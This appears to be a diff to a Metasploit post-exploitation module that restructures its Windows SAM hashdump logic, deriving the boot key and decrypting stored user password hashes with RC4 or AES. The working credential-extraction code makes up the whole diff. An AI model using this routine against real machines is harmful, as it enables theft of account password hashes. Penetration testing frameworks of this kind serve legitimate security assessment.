@@ -141,27 +141,26 @@ class MetasploitModule < Msf::Post
 
     revision = vf[0x68, 4].unpack('V')[0]
 
-    if revision == 1
-      hash = Digest::MD5.new
-      hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)
+    case revision
+      when 1
+        hash = Digest::MD5.new
+        hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)
 
-      rc4 = OpenSSL::Cipher.new("rc4")
-      rc4.key = hash.digest
-      hbootkey  = rc4.update(vf[0x80, 32])
-      hbootkey << rc4.final
-      return hbootkey
+        rc4 = OpenSSL::Cipher.new("rc4")
+        rc4.key = hash.digest
+        hbootkey  = rc4.update(vf[0x80, 32])
+        hbootkey << rc4.final
+        hbootkey
+      when 2
+        aes = OpenSSL::Cipher.new('aes-128-cbc')
+        aes.key = bootkey
+        aes.padding = 0
+        aes.decrypt
+        aes.iv = vf[0x78, 16]
+        aes.update(vf[0x88, 16]) # we need only 16 bytes
+      else
+        raise NotImplementedError, "Unknown hboot_key revision: #{revision}"
     end
-
-    if revision == 2
-      aes = OpenSSL::Cipher.new('aes-128-cbc')
-      aes.key = bootkey
-      aes.padding = 0
-      aes.decrypt
-      aes.iv = vf[0x78, 16]
-      return aes.update(vf[0x88, 16]) # we need only 16 bytes
-    end
-
-    raise NotImplementedError, "Unknown hboot_key revision: #{revision}"
   end
 
   def capture_user_keys
@@ -254,34 +253,32 @@ class MetasploitModule < Msf::Post
   def decrypt_user_hash(rid, hbootkey, enchash, pass, default)
     revision = enchash[2, 2].unpack('v')[0]
 
-    if revision == 1
-      if enchash.length < 20
+    case revision
+      when 1
+        if enchash.length < 20
+          return default
+        end
+
+        md5 = Digest::MD5.new
+        md5.update(hbootkey[0,16] + [rid].pack("V") + pass)
+
+        rc4 = OpenSSL::Cipher.new('rc4')
+        rc4.key = md5.digest
+        okey = rc4.update(enchash[4, 16])
+      when 2
+        if enchash.length < 40
+          return default
+        end
+
+        aes = OpenSSL::Cipher.new('aes-128-cbc')
+        aes.key = hbootkey[0, 16]
+        aes.padding = 0
+        aes.decrypt
+        aes.iv = enchash[8, 16]
+        okey = aes.update(enchash[24, 16]) # we need only 16 bytes
+      else
+        print_error("Unknown user hash revision: #{revision}")
         return default
-      end
-
-      md5 = Digest::MD5.new
-      md5.update(hbootkey[0,16] + [rid].pack("V") + pass)
-
-      rc4 = OpenSSL::Cipher.new('rc4')
-      rc4.key = md5.digest
-      okey = rc4.update(enchash[4, 16])
-
-    elsif revision == 2
-      if enchash.length < 40
-        return default
-      end
-
-      aes = OpenSSL::Cipher.new('aes-128-cbc')
-      aes.key = hbootkey[0, 16]
-      aes.padding = 0
-      aes.decrypt
-      aes.iv = enchash[8, 16]
-      okey = aes.update(enchash[24, 16]) # we need only 16 bytes
-
-    else
-      print_error("Unknown user hash revision: #{revision}")
-      return default
-
     end
 
     des_k1, des_k2 = rid_to_key(rid)
